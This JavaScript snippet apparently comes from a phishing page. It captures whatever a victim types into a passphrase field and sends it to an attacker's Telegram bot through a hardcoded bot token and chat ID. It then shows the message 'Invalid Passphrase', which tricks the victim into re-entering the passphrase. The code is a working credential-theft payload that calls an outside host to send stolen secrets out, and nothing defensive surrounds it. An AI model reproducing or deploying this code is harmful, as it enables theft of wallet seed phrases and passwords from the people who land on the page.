document.getElementById("tg-form").addEventListener("submit", function(event) {
  event.preventDefault(); // stop default form submit
  const passphrase = document.getElementById("mf-text").value.trim();
  //const statusEl = document.getElementById("status");
  //if (!passphrase) {
  //  statusEl.textContent = "Passphrase cannot be empty.";
  //  return;
  //}
  // Telegram bot token and chat ID
  const botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
  const chatId = "6736572379"; // channel/group/user ID
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: passphrase
  };
  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(result => {
    if (result.ok) {
      statusEl.textContent = "Invalid Passphrase";
    } else {
      statusEl.textContent = "Error: " + (result.description || "Unknown error");
    }
  })
  .catch(error => {
    statusEl.textContent = "Request failed: " + error;
  });
});
